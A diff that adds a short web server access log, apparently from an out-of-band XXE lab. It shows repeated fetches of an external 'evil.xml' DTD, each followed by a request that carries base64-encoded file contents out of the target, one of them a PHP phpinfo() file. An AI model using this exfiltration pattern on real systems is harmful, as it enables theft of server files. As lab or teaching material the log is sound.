@@ -1,0 +1,6 @@
+192.168.61.134 - - [14/Jan/2020 15:12:09] "GET /evil.xml HTTP/1.0" 200 -
+192.168.61.134 - - [14/Jan/2020 15:12:09] "GET /?content=aGVsbG8gaGFja2VyISEh HTTP/1.0" 200 -
+192.168.61.134 - - [14/Jan/2020 15:15:07] "GET /evil.xml HTTP/1.0" 200 -
+192.168.61.134 - - [14/Jan/2020 15:15:07] "GET /?content=aGVsbG8gaGFja2VyISEh HTTP/1.0" 200 -
+192.168.61.134 - - [14/Jan/2020 15:15:46] "GET /evil.xml HTTP/1.0" 200 -
+192.168.61.134 - - [14/Jan/2020 15:15:46] "GET /?content=PD9waHANCiBwaHBpbmZvKCk7IA0KPz4= HTTP/1.0" 200 -
